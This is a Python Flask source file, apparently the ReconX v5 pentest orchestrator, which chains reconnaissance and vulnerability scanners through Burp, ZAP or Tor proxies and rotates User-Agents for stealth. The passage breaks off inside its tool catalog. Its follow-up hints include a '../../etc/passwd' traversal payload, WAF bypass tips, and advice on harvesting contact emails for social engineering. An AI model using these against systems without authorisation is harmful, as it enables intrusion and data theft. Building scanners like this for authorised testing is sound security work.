#!/usr/bin/env python3
"""
ReconX v5 — Proxy Layer + Maximum Coverage + Robustez
- Suporte a Burp Suite, OWASP ZAP, Tor+Privoxy, proxy customizado
- Cada tool recebe o proxy via argumento nativo (não proxychains)
- Aba de análise manual: mostra o que o automático não cobriu
- Execução 100% sequencial

Novidades v5:
- Timeout por ferramenta com watchdog (nenhuma tool trava o pipeline)
- Bind em 127.0.0.1 por padrão (--expose para 0.0.0.0); CLI via argparse
- Proxy indisponível ou ferramenta incompatível bloqueia a execução
- Nmap é bloqueado com proxy: --proxies não cobre o port scan
- SECRET_KEY randômica; correção do conflito --random-agent/--user-agent no sqlmap
- Novas tools: nmap_vuln (NSE), gowitness, arjun, testssl, gobuster_vhost,
  nuclei_takeover, nuclei_dast
- Export de relatório Markdown: GET /api/report/<scan_id>
"""
from flask import Flask, render_template, request, jsonify, Response
from flask_socketio import SocketIO, emit
import subprocess, threading, os, json, uuid, shutil, time, re, socket, secrets, argparse, sqlite3, hashlib
from datetime import datetime
from pathlib import Path
import random
from urllib.parse import urlsplit
import tempfile
import http.cookiejar
import urllib.request
from web_intelligence import discover, plan_tests, parse_page, form_request, scoped_url

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('RECONX_SECRET') or secrets.token_hex(16)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=120, ping_interval=25)

RESULTS_DIR = Path(os.environ.get('RECONX_RESULTS', '/opt/reconx/results'))
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
SCREENS_DIR = RESULTS_DIR / "screenshots"
SCREENS_DIR.mkdir(parents=True, exist_ok=True)

# Timeout padrão por ferramenta (segundos). Override por tool via campo "timeout".
DEFAULT_TOOL_TIMEOUT = int(os.environ.get('RECONX_TIMEOUT', '600'))

# ANSI escape code stripper — wafw00f e outras tools emitem saída colorida
_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[mGKHFABCDJfhilnpRrsu]|\x1b\(B|\x1b=|\x1b>')
def strip_ansi(text: str) -> str:
    return _ANSI_RE.sub('', text)

# Auto-aprovação de checkpoint: pivôs ≤ threshold e sem critical/high → continua sem interação
AUTO_CHECKPOINT_THRESHOLD = int(os.environ.get('RECONX_AUTO_THRESHOLD', '12'))

# Webhook de notificação ao final do pipeline (Slack/Discord/custom)
# Exemplo: export RECONX_WEBHOOK='https://hooks.slack.com/services/...'
WEBHOOK_URL = os.environ.get('RECONX_WEBHOOK', '')

# ==============================================================================
# BANCO DE DADOS (SQLite) - scans, findings e assets normalizados
# ==============================================================================

DB_PATH = RESULTS_DIR / 'reconx.db'
_db_lock = threading.Lock()

SEVERITIES = ['critical', 'high', 'medium', 'low', 'info', 'unknown']
SEV_RANK = {sv: i for i, sv in enumerate(reversed(SEVERITIES))}

DB_SCHEMA = """
CREATE TABLE IF NOT EXISTS scans (
    scan_id TEXT PRIMARY KEY, target TEXT, pipeline TEXT, proxy TEXT,
    status TEXT, started_at TEXT, finished_at TEXT
);
CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id TEXT, tool TEXT, ftype TEXT,
    name TEXT, severity TEXT, target TEXT, evidence TEXT, created_at TEXT,
    dedup_key TEXT, confidence TEXT DEFAULT 'possible',
    UNIQUE(scan_id, dedup_key)
);
CREATE TABLE IF NOT EXISTS assets (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id TEXT, atype TEXT, value TEXT,
    created_at TEXT, UNIQUE(scan_id, atype, value)
);
CREATE INDEX IF NOT EXISTS idx_find_scan ON findings(scan_id);
CREATE INDEX IF NOT EXISTS idx_find_sev  ON findings(severity);
CREATE INDEX IF NOT EXISTS idx_asset_scan ON assets(scan_id);
"""

def _db():
    con = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
    con.row_factory = sqlite3.Row
    return con

def db_init():
    with _db_lock, _db() as c:
        c.execute("PRAGMA journal_mode=WAL;")
        c.executescript(DB_SCHEMA)

def db_create_scan(scan_id, target, pipeline, proxy):
    with _db_lock, _db() as c:
        c.execute("""INSERT OR REPLACE INTO scans
            (scan_id,target,pipeline,proxy,status,started_at,finished_at)
            VALUES(?,?,?,?,?,?,NULL)""",
            (scan_id, target, pipeline, proxy, 'running', datetime.now().isoformat()))

def db_finish_scan(scan_id, status='done'):
    with _db_lock, _db() as c:
        c.execute("UPDATE scans SET status=?, finished_at=? WHERE scan_id=?",
                  (status, datetime.now().isoformat(), scan_id))

def db_add_finding(scan_id, tool, ftype, name, severity, target, evidence, confidence='possible'):
    severity = severity if severity in SEVERITIES else 'unknown'
    confidence = confidence if confidence in ('confirmed', 'likely', 'possible') else 'possible'
    dedup = hashlib.sha1(f"{tool}|{ftype}|{name}|{target}".encode(), usedforsecurity=False).hexdigest()
    with _db_lock, _db() as c:
        cur = c.execute("""INSERT OR IGNORE INTO findings
            (scan_id,tool,ftype,name,severity,target,evidence,created_at,dedup_key,confidence)
            VALUES(?,?,?,?,?,?,?,?,?,?)""",
            (scan_id, tool, ftype, name, severity, target,
             (evidence or '')[:2000], datetime.now().isoformat(), dedup, confidence))
        return (cur.rowcount > 0), (cur.lastrowid if cur.rowcount > 0 else None)

def db_add_asset(scan_id, atype, value):
    with _db_lock, _db() as c:
        cur = c.execute("INSERT OR IGNORE INTO assets(scan_id,atype,value,created_at) VALUES(?,?,?,?)",
                        (scan_id, atype, value, datetime.now().isoformat()))
        return cur.rowcount > 0

def db_update_finding(scan_id, finding_id, confidence=None, evidence=None):
    """Atualiza confidence e/ou evidencia de um finding (usado pela verificacao)."""
    sets, params = [], []
    if confidence in ('confirmed', 'likely', 'possible'):
        sets.append("confidence=?"); params.append(confidence)
    if evidence is not None:
        sets.append("evidence=?"); params.append((evidence or '')[:2000])
    if not sets:
        return False
    params += [scan_id, finding_id]
    with _db_lock, _db() as c:
        cur = c.execute(f"UPDATE findings SET {', '.join(sets)} WHERE scan_id=? AND id=?", params)
        return cur.rowcount > 0

def db_scan_pipeline(scan_id):
    with _db_lock, _db() as c:
        row = c.execute("SELECT pipeline FROM scans WHERE scan_id=?", (scan_id,)).fetchone()
    return row['pipeline'] if row else None

def db_findings(scan_id):
    with _db_lock, _db() as c:
        rows = c.execute("SELECT * FROM findings WHERE scan_id=? ORDER BY created_at", (scan_id,)).fetchall()
    out = [dict(r) for r in rows]
    out.sort(key=lambda f: SEV_RANK.get(f['severity'], 0), reverse=True)
    return out

def db_summary(scan_id):
    with _db_lock, _db() as c:
        sev = {sv: 0 for sv in SEVERITIES}
        for r in c.execute("SELECT severity, COUNT(*) n FROM findings WHERE scan_id=? GROUP BY severity", (scan_id,)):
            sev[r['severity'] if r['severity'] in sev else 'unknown'] += r['n']
        atypes = {}
        for r in c.execute("SELECT atype, COUNT(*) n FROM assets WHERE scan_id=? GROUP BY atype", (scan_id,)):
            atypes[r['atype']] = r['n']
        total = c.execute("SELECT COUNT(*) n FROM findings WHERE scan_id=?", (scan_id,)).fetchone()['n']
    return {'severity': sev, 'assets': atypes, 'total': total}

db_init()

EXEC_ENV = os.environ.copy()
EXEC_ENV['PATH'] = '/root/go/bin:/usr/local/go/bin:/usr/local/bin:/usr/bin:/bin:' + os.environ.get('PATH','')

# ══════════════════════════════════════════════════════════════════════════════
# PROXY CONFIG
# ══════════════════════════════════════════════════════════════════════════════

PROXY_PROFILES = {
    "none": {
        "label": "Sem proxy (direto)",
        "desc":  "Conexão direta ao alvo",
        "icon":  "⚡",
        "http":  None,
        "socks": None,
    },
    "burp": {
        "label": "Burp Suite",
        "desc":  "Intercepta requests no Burp — inicie o Burp antes",
        "icon":  "🔴",
        "http":  "http://127.0.0.1:8080",
        "socks": None,
        "setup_tip": "Burp Suite → Proxy → Options → porta 8080. Para HTTPS: instale o certificado Burp em http://burp/cert",
    },
    "zap": {
        "label": "OWASP ZAP",
        "desc":  "Intercepta requests no ZAP — inicie o ZAP antes",
        "icon":  "🔵",
        "http":  "http://127.0.0.1:8090",
        "socks": None,
        "setup_tip": "OWASP ZAP → Tools → Options → Local Proxies → porta 8090",
    },
    "tor": {
        "label": "Tor (anonimato)",
        "desc":  "Roteia via rede Tor — IP rotacionado",
        "icon":  "🧅",
        "http":  "http://127.0.0.1:8118",   # privoxy → tor
        "socks": "socks5://127.0.0.1:9050",
        "setup_tip": "sudo service tor start && sudo apt install privoxy -y",
    },
    "custom": {
        "label": "Proxy customizado",
        "desc":  "HTTP/SOCKS5 externo configurável",
        "icon":  "⚙",
        "http":  None,   # preenchido pelo usuário
        "socks": None,
        "setup_tip": "Digite o endereço do proxy no campo abaixo",
    },
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Apple; MacBook Pro; MaxOS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15"
]

def get_random_ua():
    return random.choice(USER_AGENTS)
# Proxy ativo — alterado via socket event
active_proxy = {"profile": "none", "http": None, "socks": None}

def get_proxy_http():
    return active_proxy.get("http")

def get_proxy_socks():
    return active_proxy.get("socks")

def check_proxy_alive(host, port):
    """Verifica se o proxy está aceitando conexões."""
    try:
        with socket.create_connection((host, int(port)), timeout=2):
            pass
        return True
    except (OSError, ValueError, TypeError):
        return False

def _proxy_url_if_alive(proxy=None):
    """Valida o perfil completo; proxy inválido/down nunca vira conexão direta."""
    proxy = dict(active_proxy) if proxy is None else proxy
    http, socks = proxy.get('http'), proxy.get('socks')
    if proxy.get('profile', 'none') == 'none' and not (http or socks):
        return None
    if not (http or socks):
        raise ValueError('Proxy selecionado sem endereço. Configure-o ou selecione Sem proxy.')
    for address, schemes in ((http, ('http', 'https')), (socks, ('socks5', 'socks5h'))):
        if not address:
            continue
        try:
            parsed = urlsplit(address)
            if (parsed.scheme not in schemes or not parsed.hostname or not parsed.port
                    or parsed.path not in ('', '/') or parsed.query or parsed.fragment
                    or any(c.isspace() for c in address)):
                raise ValueError()
        except (ValueError, TypeError, AttributeError):
            raise ValueError('Endereço de proxy inválido; informe esquema, host e porta.') from None
        if not check_proxy_alive(parsed.hostname, parsed.port):
            raise ValueError('Proxy inacessível. Execução bloqueada; inicie o serviço ou selecione Sem proxy.')
    return http or socks

def _tool_proxy_url(tool_key, proxy):
    url = _proxy_url_if_alive(proxy)
    if not url:
        return None
    tool = TOOLS.get(tool_key, {})
    binary = Path(tool.get('binary', '')).name
    # --proxies do Nmap não cobre o port scan; env vars não cobrem raw sockets/DNS.
    if not tool.get('proxy_support') or binary == 'nmap':
        raise ValueError('Ferramenta sem roteamento completo por proxy; execução bloqueada. Para o lab local, selecione Sem proxy.')
    supported = {'curl', 'wget', 'sqlmap', 'ffuf', 'gobuster', 'nikto', 'nuclei',
                 'httpx', 'dalfox', 'whatweb', 'wpscan', 'feroxbuster', 'katana',
                 'commix', 'arjun', 'wafw00f', 'gowitness', 'testssl.sh', 'testssl',
                 'nomore403', 'corsy'}
    if binary not in supported:
        raise ValueError('Roteamento por proxy não implementado para esta ferramenta; execução bloqueada.')
    if binary in {'arjun', 'testssl.sh', 'testssl'} and not proxy.get('http'):
        raise ValueError('Esta ferramenta requer proxy HTTP; execução bloqueada para SOCKS.')
    return url

def proxy_status():
    """Retorna status atual do proxy."""
    profile = active_proxy.get("profile", "none")
    if profile == "none":
        return {"active": False, "profile": "none", "reachable": True}

    http = active_proxy.get("http")
    socks = active_proxy.get("socks")
    try:
        _proxy_url_if_alive(dict(active_proxy))
        reachable = True
    except ValueError:
        reachable = False

    return {
        "active": True,
        "profile": profile,
        "http": http,
        "socks": socks,
        "reachable": reachable,
        "label": PROXY_PROFILES.get(profile, {}).get("label", profile),
    }

# ══════════════════════════════════════════════════════════════════════════════
# WORDLISTS
# ══════════════════════════════════════════════════════════════════════════════

def _wl(*paths):
    for p in paths:
        if p and Path(p).exists():
            return p
    return None

WL_COMMON = _wl(
    "/opt/wordlists/SecLists/Discovery/Web-Content/common.txt",
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/usr/share/wordlists/dirb/common.txt",
)
WL_SMALL = _wl(
    "/opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt",
    "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
    "/usr/share/wordlists/dirb/small.txt",
)
WL_MEDIUM = _wl(
    "/opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
)
WL_DNS = _wl(
    "/opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
    "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
    "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt",
)
WL_PARAMS = _wl(
    "/opt/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt",
    "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    WL_COMMON,
)

# ══════════════════════════════════════════════════════════════════════════════
# TARGET SANITIZATION
# ══════════════════════════════════════════════════════════════════════════════

def to_domain(raw):
    t = str(raw).strip()
    t = re.sub(r'^https?://', '', t)
    t = t.split('/')[0].split('?')[0].split(' ')[0].split('[')[0].rstrip('.')
    if re.match(r'^[\w\.\-]+(:\d+)?$', t) and '.' in t:
        return t
    return None

def to_host(raw):
    t = str(raw).strip()
    t = re.sub(r'^https?://', '', t)
    t = t.split('/')[0].split('?')[0].split(' ')[0].split('[')[0].rstrip('.')
    # Aceita apenas hostname (labels [a-zA-Z0-9-] separados por ponto) ou IPv4,
    # com porta opcional. Rejeita lixo como "ERROR:wafw00f:Something".
    host_re = (r'^(?=.{1,253}$)'
               r'[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62})?'
               r'(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62})?)*'
               r'(?::\d{1,5})?$')
    if re.match(host_re, t):
        return t
    return None

def to_url(raw):
    t = str(raw).strip().split(' ')[0].split('[')[0]
    if re.match(r'^https?://[\w\.\-]', t):
        return t
    return None

def to_http_url(raw):
    h = to_host(raw)
    return f"http://{h}" if h else None

# ══════════════════════════════════════════════════════════════════════════════
# PROXY INJECTION — como cada tool recebe o proxy
# ══════════════════════════════════════════════════════════════════════════════

def inject_proxy(cmd: list, tool_key: str, proxy=None) -> list:
    """
    Adiciona flags de proxy e User-Agent específicas de cada tool.
    Aplica rotação de UA mesmo sem proxy para aumentar o stealth.
    """
    proxy = dict(active_proxy) if proxy is None else proxy
    http = proxy.get('http')
    proxy_url = _tool_proxy_url(tool_key, proxy)
    ua = random.choice(USER_AGENTS)

    # Mapa: prefixo do binário -> como injetar (Proxy, User-Agent)
    # Algumas tools usam -H para headers, outras flags específicas como --user-agent
    rules = {
        "curl":         lambda c: (c + ["-x", proxy_url] if proxy_url else c) + ["-H", f"User-Agent: {ua}"],
        "wget":         lambda c: (c + [f"--execute=http_proxy={proxy_url}", f"--execute=https_proxy={proxy_url}"] if proxy_url else c) + [f"--user-agent={ua}"],
        # Bloqueado por _tool_proxy_url quando um proxy está selecionado.
        "nmap":         lambda c: c,
        # sqlmap: o template já traz --random-agent; injetar --user-agent geraria
        # conflito. Quando há proxy, só adicionamos a flag de proxy.
        "sqlmap":       lambda c: (c + ["--proxy", proxy_url] if proxy_url else c),
        "ffuf":         lambda c: (c + ["-x", proxy_url] if proxy_url else c) + ["-H", f"User-Agent: {ua}"],
        "gobuster":     lambda c: (c + ["--proxy", proxy_url] if proxy_url else c) + ["--user-agent", ua],
        "nikto":        lambda c: (c + ["-useproxy", proxy_url] if proxy_url else c) + ["-useragent", ua],
        "nuclei":       lambda c: (c + ["-proxy", proxy_url] if proxy_url else c) + ["-H", f"User-Agent: {ua}"],
        "httpx":        lambda c: (c + ["-http-proxy", proxy_url] if proxy_url else c) + ["-H", f"User-Agent: {ua}"],
        "dalfox":       lambda c: (c + ["--proxy", proxy_url] if proxy_url else c) + ["--user-agent", ua],
        "whatweb":      lambda c: (c + [f"--proxy={proxy_url}"] if proxy_url else c) + [f"--user-agent={ua}"],
        "wpscan":       lambda c: (c + ["--proxy", proxy_url] if proxy_url else c) + ["--user-agent", ua],
        "feroxbuster":  lambda c: (c + ["--proxy", proxy_url] if proxy_url else c) + ["--user-agent", ua],
        "katana":       lambda c: (c + ["-proxy", proxy_url] if proxy_url else c) + ["-H", f"User-Agent: {ua}"],
        "commix":       lambda c: (c + ["--proxy=" + proxy_url] if proxy_url else c) + ["--user-agent=" + ua],
        "arjun":        lambda c: (c + ["--proxy", http] if http else c) + ["--headers", f"User-Agent: {ua}"],
        "wafw00f":      lambda c: c, # WAFw00f pega via env vars (proxy_env)
        "gowitness":    lambda c: (c + ["--chrome-proxy", proxy_url] if proxy_url else c) + ["--chrome-user-agent", ua],
        "testssl.sh":   lambda c: (c + ["--proxy", re.sub(r'^https?://', '', http)] if http else c),
        "testssl":      lambda c: (c + ["--proxy", re.sub(r'^https?://', '', http)] if http else c),
        "dnsrecon":          lambda c: c,
        "subfinder":         lambda c: c,
        "assetfinder":       lambda c: c,
        "dnsx":              lambda c: c,
        "gau":               lambda c: c,
        "waybackurls":       lambda c: c,
        # v6 — novas tools
        "tlsx":              lambda c: c,
        "amass":             lambda c: c,
        "findomain":         lambda c: c,
        "masscan":           lambda c: c,
        "rustscan":          lambda c: c,
        "uncover":           lambda c: c,
        "cloud_enum":        lambda c: c,
        "cvemap":            lambda c: c,
        "interactsh-client": lambda c: c,
        "nomore403":         lambda c: (c + ["--proxy", proxy_url] if proxy_url else c),
        "corsy":             lambda c: (c + ["--proxy", proxy_url] if proxy_url else c),
    }

    binary = cmd[0] if cmd else ''
    for prefix, inject_fn in rules.items():
        if binary.endswith(prefix) or binary == prefix:
            return inject_fn(list(cmd))

    return cmd  # tool desconhecida — retorna sem modificar

def proxy_env(tool_key=None, proxy=None) -> dict:
    """
    Monta o ambiente usando o mesmo perfil dos argumentos. Remove proxies
    herdados e NO_PROXY para que o ambiente não contorne o perfil selecionado.
    Ferramentas incompatíveis são bloqueadas antes de criar o subprocesso.
    """
    proxy = dict(active_proxy) if proxy is None else proxy
    env = EXEC_ENV.copy()
    for key in list(env):
        if key.lower() in {'http_proxy', 'https_proxy', 'all_proxy', 'no_proxy'}:
            del env[key]
    env['HTTP_USER_AGENT'] = random.choice(USER_AGENTS)
    if not _tool_proxy_url(tool_key, proxy):
        return env

    http = proxy.get('http')
    socks = proxy.get('socks')
    if http:
        env['HTTP_PROXY']  = http
        env['HTTPS_PROXY'] = http
        env['http_proxy']  = http
        env['https_proxy'] = http
    if socks:
        env['ALL_PROXY']   = socks
        env['all_proxy']   = socks
    return env

# ══════════════════════════════════════════════════════════════════════════════
# TOOL CATALOG
# ══════════════════════════════════════════════════════════════════════════════

TOOLS = {
    'adaptive_web': {
        'label': 'Adaptive Web', 'phase': 'test', 'category': 'intelligence',
        'desc': 'Descobre formulários/login e escolhe testes GET/POST por evidência',
        'cmd': ['curl', '{url}'], 'input': 'url', 'output': 'raw',
        'binary': 'curl', 'tags': ['active', 'crawl', 'params'],
        'proxy_support': True, 'manual_followup': [],
    },
    # RECON — SUBDOMÍNIOS
    "subfinder": {
        "label": "Subfinder", "phase": "recon", "category": "subdomains",
        "desc": "Enumeração passiva de subdomínios via APIs",
        "cmd": ["subfinder", "-d", "{domain}", "-silent", "-oJ", "-timeout", "30"],
        "input": "domain", "output": "subdomains",
        "json": True, "binary": "subfinder", "tags": ["passive","fast"],
        "proxy_support": False,
        "manual_followup": [],
    },
    "assetfinder": {
        "label": "Assetfinder", "phase": "recon", "category": "subdomains",
        "desc": "Subdomínios via cert transparency",
        "cmd": ["assetfinder", "--subs-only", "{domain}"],
        "input": "domain", "output": "subdomains",
        "binary": "assetfinder", "tags": ["passive","fast"],
        "proxy_support": False,
        "manual_followup": [],
    },
    "dnsx": {
        "label": "DNSx", "phase": "recon", "category": "subdomains",
        "desc": "Resolve e valida subdomínios",
        "cmd": ["dnsx", "-d", "{domain}", "-silent", "-resp", "-json"],
        "input": "domain", "output": "subdomains",
        "json": True, "binary": "dnsx", "tags": ["active","dns"],
        "proxy_support": False,
        "manual_followup": [],
    },
    "dnsrecon": {
        "label": "DNSRecon", "phase": "recon", "category": "subdomains",
        "desc": "Enumeração DNS — zone transfer, bruteforce",
        "cmd": ["dnsrecon", "-d", "{domain}", "-t", "std"],
        "input": "domain", "output": "subdomains",
        "binary": "dnsrecon", "tags": ["active","dns"],
        "proxy_support": False,
        "manual_followup": ["Tente zone transfer manual: dig AXFR @ns1.{domain} {domain}"],
    },
    "whois": {
        "label": "WHOIS", "phase": "recon", "category": "osint",
        "desc": "Registro e informações do domínio",
        "cmd": ["whois", "{domain}"],
        "input": "domain", "output": "whois",
        "binary": "whois", "tags": ["passive"],
        "proxy_support": False,
        "manual_followup": ["Verifique emails de contato para engenharia social"],
    },

    # RECON — PORTAS
    "nmap_quick": {
        "label": "Nmap Quick", "phase": "recon", "category": "ports",
        "desc": "Top 1000 portas + scripts padrão",
        "cmd": ["nmap", "-sV", "-sC", "--open", "-T4", "--max-retries", "2", "{host}"],
        "input": "host", "output": "ports",
        "binary": "nmap", "tags": ["active","ports"],
        "proxy_support": True,
        "manual_followup": [
            "Teste serviços encontrados manualmente (FTP anon, SMB null session, SSH user enum)",
            "Para portas incomuns: nc -nv {host} <porta>",
            "Scripts NSE específicos: nmap --script=<categoria> {host}",
        ],
    },
    "nmap_full": {
        "label": "Nmap Full", "phase": "recon", "category": "ports",
        "desc": "Todas as 65535 portas",
        "cmd": ["nmap", "-p-", "--open", "-T4", "-Pn", "--max-retries", "1", "{host}"],
        "input": "host", "output": "ports",
        "binary": "nmap", "tags": ["active","ports","slow"],
        "proxy_support": True,
        "manual_followup": ["Pegue portas altas encontradas e rode nmap -sV nelas"],
    },
    "naabu": {
        "label": "Naabu", "phase": "recon", "category": "ports",
        "desc": "Port scanner rápido em Go (ignora CDN automaticamente)",
        "cmd": ["naabu", "-host", "{host}", "-top-ports", "1000", "-silent", "-json", "-ec"],
        "input": "host", "output": "ports",
        "json": True, "binary": "naabu", "tags": ["active","ports","fast"],
        "proxy_support": False,
        "manual_followup": [],
    },
    "nmap_vuln": {
        "label": "Nmap Vuln (NSE)", "phase": "test", "category": "ports",
        "desc": "Scripts NSE da categoria vuln contra serviços detectados",
        "cmd": ["nmap", "-sV", "-Pn", "-T4", "--script=vuln",
                "--script-args", "http.useragent=Mozilla/5.0", "{host}"],
        "input": "host", "output": "ports",
        "binary": "nmap", "tags": ["active","vuln","slow"],
        "proxy_support": True, "timeout": 1200,
        "manual_followup": [
            "Cada finding NSE pode ter falso positivo — confirme manualmente",
            "vulners script lista CVEs por versão: cruze com exploit-db",
        ],
    },

    # RECON — WEB
    "httpx": {
        "label": "HTTPx", "phase": "recon", "category": "web",
        "desc": "Probe HTTP — status, título, tecnologias, portas comuns (80/443/8080/8443/8000/3000)",
        "cmd": ["httpx", "-u", "{http_url}", "-silent", "-title", "-tech-detect",
                "-status-code", "-content-length", "-json",
                "-follow-host-redirects", "-ports", "80,443,8080,8443,8888,8000,3000,3001,5000"],
        "input": "host", "output": "live_hosts",
        "json": True, "binary": "httpx", "tags": ["active","web","fast"],
        "proxy_support": True,
        "manual_followup": [
            "Visite a aplicação no browser com Burp interceptando",
            "Mapeie toda a aplicação manualmente no Burp Site Map",
        ],
    },
    "whatweb": {
        "label": "WhatWeb", "phase": "recon", "category": "web",
        "desc": "Fingerprint de CMS e tecnologias",
        "cmd": ["whatweb", "--color=never", "--no-errors", "{http_url}"],
        "input": "host", "output": "fingerprint",
        "binary": "whatweb", "tags": ["active","fingerprint"],
        "proxy_support": True,
        "manual_followup": [
            "Pesquise CVEs da versão identificada no exploit-db.com",
            "Verifique configurações padrão do CMS detectado",
        ],
    },
    "wafw00f": {
        "label": "WAFw00f", "phase": "recon", "category": "web",
        "desc": "Detecta tipo de WAF presente",
        "cmd": ["wafw00f", "{http_url}"],
        "input": "host", "output": "waf",
        "binary": "wafw00f", "tags": ["active","waf"],
        "proxy_support": True,
        "manual_followup": [
            "Se tiver WAF: teste bypass com encoding, case variation, comentários SQL",
            "Consulte: https://github.com/0xInfection/Awesome-WAF",
        ],
    },
    "curl_headers": {
        "label": "cURL Headers", "phase": "recon", "category": "web",
        "desc": "Inspeciona headers HTTP de resposta",
        "cmd": ["curl", "-sI", "--max-time", "15", "-L", "{http_url}"],
        "input": "host", "output": "headers",
        "binary": "curl", "tags": ["passive","fast"],
        "proxy_support": True,
        "manual_followup": [
            "Verifique ausência de: CSP, X-Frame-Options, HSTS, X-Content-Type-Options",
            "Cookies sem Secure/HttpOnly são alvos de XSS/MITM",
            "Server header expõe versão? Busque CVEs",
        ],
    },
    "gowitness": {
        "label": "GoWitness", "phase": "recon", "category": "web",
        "desc": "Screenshot do alvo (Chrome headless) p/ triagem visual",
        "cmd": ["gowitness", "scan", "single", "--url", "{http_url}",
                "--screenshot-path", str(SCREENS_DIR), "--write-jsonl", "--quiet"],
        "input": "host", "output": "raw",
        "binary": "gowitness", "tags": ["active","screenshot"],
        "proxy_support": True, "timeout": 120,
        "manual_followup": [
            f"Screenshots salvos em {SCREENS_DIR} — priorize logins, painéis e páginas legadas",
            "Páginas com visual antigo costumam ser as mais vulneráveis",
        ],
    },

    # RECON — FUZZING
    "ffuf_dirs": {
        "label": "FFUF Dirs", "phase": "recon", "category": "fuzzing",
        "desc": "Fuzzing de diretórios com recursão automática (depth 2)",
        "cmd": ["ffuf", "-u", "{http_url}/FUZZ",
                "-w", WL_SMALL or WL_COMMON or "/usr/share/wordlists/dirb/common.txt",
                "-mc", "200,201,204,301,302,307,401,403,405",
                "-t", "40", "-ac", "-s",
                "-recursion", "-recursion-depth", "2"],
        "input": "host", "output": "dirs",
        "binary": "ffuf", "tags": ["active","fuzzing"],
        "proxy_support": True,
        "manual_followup": [
            "Acesse diretórios 403 com diferentes métodos HTTP (PUT, OPTIONS)",
            "Tente path traversal em parâmetros: ../../etc/passwd",
            "Diretórios .git, .svn expostos contêm código fonte",
        ],
    },
    "ffuf_ext": {
        "label": "FFUF Extensions", "phase": "recon", "category": "fuzzing",
        "desc": "Fuzzing com extensões .php .html .bak .txt",
        "cmd": ["ffuf", "-u", "{http_url}/FUZZ",
                "-w", WL_COMMON or "/usr/share/wordlists/dirb/common.txt",
                "-e", ".php,.html,.txt,.bak,.old,.zip,.conf,.env,.log",
                "-mc", "200,201,301,302,401,403",
                "-t", "40", "-ac", "-s"],
        "input": "host", "output": "dirs",
        "binary": "ffuf", "tags": ["active","fuzzing"],
        "proxy_support": True,
        "manual_followup": [
            "Arquivo .env contém credenciais e chaves de API",
            "Backups .bak/.old podem conter código PHP em plain text",
            "Teste LFI em qualquer parâmetro que aceite caminhos",
        ],
    },
    "gobuster_dir": {
        "label": "Gobuster Dirs", "phase": "recon", "category": "fuzzing",
        "desc": "Enumeração de diretórios com gobuster",
        "cmd": ["gobuster", "dir",
                "-u", "{http_url}",
                "-w", WL_COMMON or "/usr/share/wordlists/dirb/common.txt",
                "-q", "--no-error", "--no-progress", "-b", "404,400,503"],
        "input": "host", "output": "dirs",
        "binary": "gobuster", "tags": ["active","fuzzing"],
        "proxy_support": True,
        "manual_followup": [],
    },
    "gobuster_vhost": {
        "label": "Gobuster VHost", "phase": "recon", "category": "fuzzing",
        "desc": "Descoberta de virtual hosts (Host header) — apps escondidas no mesmo IP",
        "cmd": ["gobuster", "vhost",
                "-u", "{http_url}",
                "-w", WL_DNS or WL_COMMON or "/usr/share/wordlists/dirb/common.txt",
                "-q", "--no-error", "--no-progress", "--append-domain"],
        "input": "host", "output": "raw",
        "binary": "gobuster", "tags": ["active","fuzzing","vhost"],
        "proxy_support": True,
        "manual_followup": [
            "VHosts encontrados: adicione ao /etc/hosts e teste como alvo separado",
            "Apps internas geralmente expostas só via Host header correto",
        ],
    },
    "arjun": {
        "label": "Arjun (params)", "phase": "recon", "category": "fuzzing",
        "desc": "Descoberta de parâmetros HTTP ocultos (GET/POST)",
        "cmd": ["arjun", "-u", "{url}", "-q"],
        "input": "url", "output": "raw",
        "binary": "arjun", "tags": ["active","params"],
        "proxy_support": True, "timeout": 300,
        "manual_followup": [
            "Parâmetros ocultos achados: teste IDOR, SQLi, SSRF e LFI neles",
            "Combine com dalfox/sqlmap apontando para os params descobertos",
        ],
    },

    # RECON — OSINT
    "waybackurls": {
        "label": "Wayback URLs", "phase": "recon", "category": "osint",
        "desc": "URLs históricas do Wayback Machine",
        "cmd": ["waybackurls", "{domain}"],
        "input": "domain", "output": "urls",
        "binary": "waybackurls", "tags": ["passive","osint"],
        "proxy_support": False,
        "manual_followup": [
            "Filtre URLs com parâmetros: grep '?' urls.txt",
            "Endpoints antigos podem estar sem autenticação",
            "Busque parâmetros como ?redirect=, ?url=, ?file= (open redirect, LFI, SSRF)",
        ],
    },
    "gau": {
        "label": "GAU", "phase": "recon", "category": "osint",
        "desc": "URLs de Wayback + CommonCrawl + OTX",
        "cmd": ["gau", "--subs", "{domain}"],
        "input": "domain", "output": "urls",
        "binary": "gau", "tags": ["passive","osint"],
        "proxy_support": False,
        "manual_followup": [
